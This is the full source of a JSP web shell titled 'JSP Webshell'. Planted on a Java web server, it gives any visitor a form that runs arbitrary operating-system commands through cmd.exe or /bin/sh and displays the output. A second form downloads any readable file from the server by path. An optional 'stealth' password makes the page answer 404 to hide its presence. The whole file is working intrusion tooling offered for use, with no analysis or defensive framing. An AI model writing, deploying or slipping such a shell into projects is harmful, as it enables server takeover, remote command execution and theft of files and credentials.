<%@ page import="java.io.BufferedReader,java.io.File,java.io.FileInputStream,java.io.InputStreamReader" trimDirectiveWhitespaces="true" %>
<%!
    String htmlEscape(String in) {
        return in.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll("\"", "&quot;").replaceAll("'", "&#039;");
    }
%>
<%
    String stealthPassword = "";
    if(!stealthPassword.equals("") && !stealthPassword.equals(request.getParameter("pw"))) {
        response.setStatus(404);
        return;
    }
    String downloadFile = request.getParameter("download-file");
    String downloadMsg = "";
    if(downloadFile != null && !downloadFile.trim().equals("")) {
        File f = new File(downloadFile);
        if(f.canRead()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + f.getName() + "\"");
            FileInputStream fis = new FileInputStream(f);
            int i;
            while((i = fis.read()) != -1) {
                out.write(i);
            }
            fis.close();
            out.close();
        } else {
            downloadMsg = "Error accessing file <code>" + htmlEscape(downloadFile) + "</code><br />\n";
        }
    }
    String shell = null;
    String shellOpt = null;
    String cmd = request.getParameter("cmd");
    Integer exitCode = null;
    StringBuilder stdout = new StringBuilder("");
    if(request.getMethod().equals("POST") && cmd != null && !cmd.trim().equals("")) {
        String osName = System.getProperty("os.name").toLowerCase();
        if(osName.contains("windows")) {
            shell = "cmd.exe";
            shellOpt = "/c";
        } else {
            shell = "/bin/sh";
            shellOpt = "-c";
        }
        ProcessBuilder pb = new ProcessBuilder(shell, shellOpt, cmd);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String s = null;
        while((s = stdoutReader.readLine()) != null) {
            stdout.append(s).append(System.getProperty("line.separator"));
        }
        exitCode = p.waitFor();
    }
%>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>JSP Webshell</title>
    </head>
    <body style="font-family: sans-serif;">
        <form id="form-cmd" method="POST" action="">
            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" style="width: 80%;" />
            <input type="submit" name="submit-cmd" value="Run" />
        </form>
        <div style="margin: 3px auto;">
<%
    if(shell != null) {
        out.println("Output of command <code>" + htmlEscape(shell) + " " + htmlEscape(shellOpt) + "</code> with argument: <code>" + htmlEscape(cmd) + "</code>");
    } else {
        out.println("Run a command to see its output");
    }
%>
        </div>
        <textarea readonly="readonly" rows="25" style="width: 80%;">
<%= htmlEscape(stdout.toString()) %>
        </textarea>
        <div style="margin: 3px auto;">
<%
    if(exitCode != null) {
        out.println("Exit code: <code>" + exitCode + "</code>");
    }
%>
        </div>
        <div style="margin: 1rem auto;">
            <b>File Download</b>
            <div>
<%= downloadMsg %>
            </div>
            <form method="POST" action="">
                <input type="text" name="download-file" placeholder="File to download" />
                <input type="submit" name="submit-download" value="Download" />
            </form>
        </div>
        <script>
            function saveHistory() {
                var cmd = document.getElementById("cmd").value;
                if(cmd.trim() != "" && cmd != shellHistory[shellHistory.length - 1]) {
                    shellHistory.push(cmd);
                }
                sessionStorage.setItem("shellHistory", JSON.stringify(shellHistory));
            }
            function cycleHistory(event) {
                if(event.code == "ArrowUp" && historyPos > 0) {
                    historyPos--;
                    document.getElementById("cmd").value = shellHistory[historyPos];
                } else if(event.code == "ArrowDown" && historyPos < shellHistory.length) {
                    historyPos++;
                    if(historyPos < shellHistory.length) {
                        document.getElementById("cmd").value = shellHistory[historyPos];
                    } else {
                        document.getElementById("cmd").value = "";
                    }
                }
            }
            var shellHistory = JSON.parse(sessionStorage.getItem("shellHistory"));
            if(shellHistory == null) {
                shellHistory = new Array();
            }
            var historyPos = shellHistory.length;
            document.getElementById("form-cmd").addEventListener("submit", saveHistory);
            document.getElementById("cmd").addEventListener("keydown", cycleHistory);
        </script>
    </body>
</html>
